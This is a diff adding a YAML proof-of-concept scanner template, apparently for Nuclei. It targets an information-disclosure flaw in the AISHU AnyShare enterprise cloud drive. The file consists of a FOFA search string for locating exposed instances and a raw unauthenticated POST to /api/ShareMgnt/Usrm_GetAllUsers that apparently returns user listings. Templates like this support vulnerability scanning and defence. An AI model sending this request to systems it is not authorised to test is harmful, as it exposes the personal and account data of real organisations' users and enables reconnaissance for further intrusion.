@@ -1,0 +1,24 @@
+id: poc-xkk7ccttffaoe89p
+info:
+  name: 爱数企业云盘Usrm_GetAllUsers存在任意信息泄露漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xkk7ccttffaoe89p'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: xkk7ccttffaoe89p
+    fofa: app="AISHU-AnyShare"
+http:
+- raw:
+  - 'POST /api/ShareMgnt/Usrm_GetAllUsers HTTP/1.1
+
+    Host: {{Hostname}}
+
+
+    [1,100]'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
